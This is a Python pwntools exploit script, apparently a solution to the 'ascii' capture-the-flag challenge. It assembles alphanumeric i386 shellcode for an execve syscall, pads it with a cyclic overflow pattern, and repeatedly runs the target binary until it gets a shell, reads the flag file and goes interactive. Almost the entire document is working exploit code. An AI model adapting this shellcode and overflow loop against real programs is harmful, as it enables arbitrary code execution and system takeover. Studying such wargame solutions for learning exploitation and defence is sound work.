# polymorphic shellcode 
from pwn import *

context(arch = 'i386', os = 'linux')
context.log_level = 'debug'

# https://blackcloud.me/Linux-shellcode-alphanumeric/
# https://c9x.me/x86/html/file_module_x86_id_249.html
shellcode = """"""

# set stack top to argv pointers
shellcode += """
popa 
"""
shellcode = shellcode * 5

# point stack to top of argv pointers and save in edi=0xcd80cd80
shellcode += """
pop esp
pop edi
"""

# push 0x80000000 and save it with offset in esi
shellcode += """
push ebx
push ebx
push ebx
push 0x7f
pop eax
inc eax
push eax
dec esp 
dec esp 
dec esp
pop eax
xor al, 0x2b
push eax
pop esi
"""

# set registers
# set $eax=5
shellcode += """
push edx
pop eax
"""
# set $eax=11
inc_eax = """
inc eax
"""
shellcode += inc_eax*(11-5)
# set edx and ecx to 0
shellcode += """
push ebx
pop ecx
push ebx
pop edx
"""
# set ebx to something (TODO  - ln -s it)
shellcode += """
push esi
pop ebx
"""

# copy int 0x80
shellcode += """
push esi
pop esp
push edi
"""

print "shellcode:\n"+shellcode

sh = asm(shellcode)
print "sh = {}".format(sh)
int_80h = p32(0xCD80CD80)
env = {}#{str(x): int_80h*30000 for x in range(12)}
is_debug = False

while True:
    if is_debug:
        p = process(executable="/tmp/b/ascii", argv=[int_80h]*5, env=env, cwd="/tmp/b")
        x=raw_input()
    else:
        p = process(executable="/home/ascii/ascii", argv=[int_80h]*5, env=env,  cwd="/tmp/b")
    
    payload = sh+cyclic(168-len(sh))+"\x74\x00"
    print "payload: "+payload
    p.send(payload)
    p.sendline("cat /home/ascii/flag\necho hello")
    try:
        print p.recvuntil("bug...\n")
        print p.recvuntil('hello')
        p.interactive()
        break
    except:
        p.close()
    if is_debug:
        break